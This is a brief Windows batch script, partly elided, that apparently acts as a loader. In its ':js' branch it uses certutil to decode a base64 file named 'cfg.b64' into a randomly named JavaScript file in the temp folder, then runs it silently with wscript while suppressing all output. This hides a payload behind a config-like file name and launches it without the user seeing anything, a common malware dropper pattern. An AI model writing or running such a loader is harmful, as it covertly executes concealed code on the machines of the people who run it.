@echo off
setlocal
set "OUT=%TEMP%\rbc_bcefd2cbece4c011.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_bcefd2cbece4c011.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_bcefd2cbece4c011.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_bcefd2cbece4c011.js"
exit /b 0
